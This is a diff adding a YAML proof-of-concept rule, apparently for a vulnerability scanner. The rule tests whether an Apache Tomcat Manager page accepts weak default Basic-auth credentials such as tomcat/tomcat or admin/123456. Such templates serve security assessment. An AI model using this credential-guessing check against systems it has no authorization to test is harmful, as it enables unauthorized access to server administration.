@@ -1,0 +1,27 @@
+name: poc-yaml-tomcat-manager-week
+sets:
+  username:
+    - tomcat
+    - admin
+  password:
+    - tomcat
+    - admin
+    - 123456
+  payload:
+    - base64(username+":"+password)
+rules:
+  - method: GET
+    path: /manager/html
+    follow_redirects: false
+    expression: |
+      response.status == 401  && response.body.bcontains(b"tomcat") && response.body.bcontains(b"manager")
+  - method: GET
+    path: /manager/html
+    headers:
+      Authorization: Basic {{payload}}
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(b"tomcat") && response.body.bcontains(b"manager")
+detail:
+  author: shadown1ng(https://github.com/shadown1ng)
+
